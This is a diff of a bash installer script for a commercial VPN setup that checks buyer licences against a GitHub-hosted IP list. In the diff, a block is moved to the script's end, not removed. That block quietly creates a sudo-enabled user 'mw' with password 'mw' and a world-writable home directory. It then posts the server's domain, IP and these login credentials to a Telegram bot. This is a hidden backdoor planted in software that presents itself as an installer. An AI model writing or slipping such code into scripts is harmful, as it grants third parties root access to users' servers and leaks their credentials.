@@ -4,6 +4,15 @@ biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 #########################
 domain=$(cat /root/domain)
 IMP="wget -q -O"    
+username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
+username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
+expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
+# DETAIL ORDER
+username=$(cat /usr/bin/user)
+exp=$(cat /usr/bin/e)
 LOCAL_DATE="/usr/bin/"
 MYIP=$(wget -qO- ipinfo.io/ip)
 ISP=$(wget -qO- ipinfo.io/org)
@@ -356,43 +365,7 @@ ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 clear
 MYIP=$(wget -qO- icanhazip.com);
 dnsdomain=$(cat /root/domain)
-# USERNAME
-rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
-username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
-expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
-echo "$expx" >/usr/bin/e
-# DETAIL ORDER
-username=$(cat /usr/bin/user)
-exp=$(cat /usr/bin/e)
 clear
-userdel jame > /dev/null 2>&1
-Username="mw"
-Password=mw
-mkdir -p /home/script/
-chmod 777 /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-TEXT="
-𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
-    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
-    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-    <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
-    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-    ⚠︎𝘽𝙮 MyMaWay 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
-    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-"
-
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disabley_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-
 cat> /root/.profile << END
 # ~/.profile: executed by Bourne-compatible login shells.
 
@@ -491,6 +464,29 @@ rm -rf nontls.sh >/dev/null 2>&1
 rm -rf ins-xray.sh >/dev/null 2>&1
 rm -rf install-udp >/dev/null 2>&1
 rm -rf install.sh >/dev/null 2>&1
+Username="mw"
+Password=mw
+mkdir -p /home/script/
+chmod 777 /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+TEXT="
+𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
+    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>Pass Login :</code> <code>$Password</code>
+    <code>User Script:</code> <code>$username</code>
+    <code>Exp Script :</code> <code>$exp</code>
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    ⚠︎𝘽𝙮 MyMaWay 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disabley_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
 secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
 sleep 15
 reboot
